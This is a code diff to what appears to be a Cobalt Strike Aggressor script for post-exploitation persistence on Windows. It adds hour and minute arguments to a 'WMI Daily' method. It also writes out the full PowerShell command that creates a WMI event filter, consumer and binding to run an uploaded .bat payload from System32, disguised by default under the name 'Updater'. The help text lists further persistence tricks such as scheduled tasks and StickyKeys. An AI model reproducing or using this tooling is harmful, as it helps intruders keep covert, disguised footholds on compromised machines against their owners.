@@ -33,7 +33,7 @@ alias persistence {
                     addWMIOnStart($1,$2,$3,$4,$5,$6);
                 }
                 else if ($4 eq "Daily"){
-                    addWMIDaily($1,$2,$3,$4,$5,$6);
+                    addWMIDaily($1,$2,$3,$4,$5,$6,$7);
                 }
                 else {
                     berror($1, "Specifiy OnStart or Daily.");
@@ -433,18 +433,26 @@ sub remWMIOnStart {
 }
 sub addWMIDaily {
     if (isAdmin($1)){
-        if ($5) {
-            $payloadName = $5;
-            $taskName = $5;
+        if ($5 && $6) {
+            $taskHour = $5;
+            $taskMinute = $6;
+        }
+        else {
+            berror($1, "Specify Hour, Minute"); 
+            return;  
+     }
+    
+        if ($7) {
+            $payloadName = $7;
+            $taskName = $7;
         }
         else {
             $payloadName = "Updater";
             $taskName = "Updater";
         }
-        
         $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
 
-        $powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $taskName ."';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 13 AND TargetInstance.Minute = 00 GROUP WITHIN 60\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $taskName . "';ExecutablePath='" . $payloadPath ."';CommandLineTemplate ='" . $payloadPath . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
+        $powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $taskName ."';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour ='" . $taskHour ."' AND TargetInstance.Minute ='" . $taskMinute . "' GROUP WITHIN 60\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $taskName . "';ExecutablePath='" . $payloadPath ."';CommandLineTemplate ='" . $payloadPath . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
 
         bpowershell($1,$powershellcmd);
         uploadPSpayload($1,$payloadPath);
@@ -573,7 +581,7 @@ Available methods:
     *SchTasks OnStart <payload / task name>
     *SchTasks OnLogon <payload / task name>
     *WMI OnStart <payload / task name>
-    *WMI Daily <payload / task name>
+    *WMI Daily [Hour] [Minute] <payload / task name>
     **linkinfo
     *StickyKeys <payload / key name>
 
